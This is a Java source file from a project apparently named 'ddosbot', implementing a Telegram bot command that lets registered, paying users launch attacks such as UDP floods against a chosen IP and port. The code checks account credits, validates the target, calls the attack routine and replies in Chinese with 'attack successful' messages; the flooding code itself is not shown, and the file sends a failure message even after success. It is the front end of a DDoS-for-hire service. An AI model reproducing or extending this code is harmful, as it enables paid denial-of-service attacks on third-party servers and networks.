package me.yeoc.ddosbot.command.impl;

import me.yeoc.ddosbot.Main;
import me.yeoc.ddosbot.command.Command;
import me.yeoc.ddosbot.data.IDatabase;
import me.yeoc.ddosbot.object.User;
import me.yeoc.ddosbot.util.CheckUtil;
import org.telegram.telegrambots.meta.api.objects.Message;

import java.util.Arrays;

public class AttackCommand extends Command {
    public AttackCommand() {
        super("UDP","攻击", Main.getAllowMethod().keySet().toArray(new String[0]));
    }

    @Override
    public String getIdentity() {
        return "Attack";
    }

    @Override
    public boolean toReg() {
        return false;
    }

    @Override
    protected boolean limited() {
        return false;
    }

    @Override
    protected void perform(Message message) {
        if (!Main.isAttackAble()){
            sendMessage(message.getChatId(),"无法发起攻击! 原因: "+Main.getReason());
            return;
        }


        IDatabase database = Main.getDatabase();
        if (!database.existUser(message.getFrom().getId())) {
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 请先注册账户!");
            return;
        }

        String text = message.getText();
        String[] split = text.split(" ");

        User user = database.getUser(message.getFrom().getId());
        if (!user.canAttack(split[0])) {
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 你的点数不够或已过期!");
            return;
        }

        if (split.length != 3){
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 指令参数错误!");
            return;
        }
        String ip = split[1];
        if (!CheckUtil.ipCheck(ip)){
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 你输入的IP不合法!");
            return;
        }
        String port =split[2];
        if (!CheckUtil.portCheck(port)) {
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 你输入的端口不合法!");
            return;
        }

        sendMessage(message.getChatId(),"正在准备发射: IP:"+ip+"   端口: "+port);
        if (user.attack(split[0],ip,Integer.parseInt(port))) {
            database.saveUser(user);
            sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 攻击成功!","目标IP: "+ip,"目标端口: "+port);

        }
        sendMessage(message.getChatId(),"@"+message.getFrom().getUserName()+" 攻击失败!");

    }
}
